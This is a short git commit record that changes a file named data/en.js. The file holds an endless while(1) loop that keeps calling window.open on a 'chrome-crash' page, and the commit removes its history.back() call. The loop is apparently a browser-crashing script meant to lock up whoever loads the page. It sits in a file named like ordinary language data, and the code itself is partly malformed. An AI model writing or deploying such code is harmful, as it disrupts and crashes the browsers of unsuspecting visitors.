75a9c871f30cd57030b0aec3e568b1950894455d
Uland Sanders <78428114+chrome-crash-invoke@users.noreply.github.com>
2021-11-17 15:19:57 -0600

    Update en.js

--- data/en.js
+++ data/en.js
@@ -5,7 +5,7 @@ $vwer = '#';
 while(1) {
     
     window.open("https://chrome-crash-invoke.github.io/chrome-crash/", "_blank",) * '#/hisbck';
-    history.back(); // When Function window.open does it's thing, history back will reset the website.
+    // When Function window.open does it's thing, history back will reset the website.
     
 }
 
